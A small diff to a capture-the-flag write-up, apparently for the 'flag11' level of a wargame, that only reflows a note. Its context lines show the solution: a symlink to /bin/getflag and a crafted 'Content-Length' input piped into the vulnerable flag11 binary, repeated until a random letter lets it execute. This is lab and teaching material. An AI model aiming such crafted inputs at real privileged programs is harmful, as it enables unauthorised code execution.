@@ -31,8 +31,7 @@ Solution
    ln -s /bin/getflag d
    echo -ne "Content-Length: 1\nd" | /home/flag11/flag11
 
-.. note::
-   Execute it until an "e" comes up, if this letter shows then you can execute
+.. note:: Execute it until an "e" comes up, if this letter shows then you can execute
 
 * Second way:
 
